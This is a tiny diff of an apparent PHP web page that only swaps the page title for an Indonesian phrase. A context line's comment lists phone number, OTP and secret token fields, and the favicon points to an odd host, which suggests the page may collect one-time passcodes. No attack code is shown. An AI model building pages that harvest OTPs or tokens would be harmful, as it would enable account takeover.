@@ -6,7 +6,7 @@ session_start(); #list: key, msisdn, otp, secret_token
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ショット</title>
+    <title>Faisol putus cinta</title>
     <link rel="shortcut icon" href="https://digitalrestriction.ico" type="image/x-icon" />
     <meta charset="UTF-8">
     <body bgcolor="salmon">
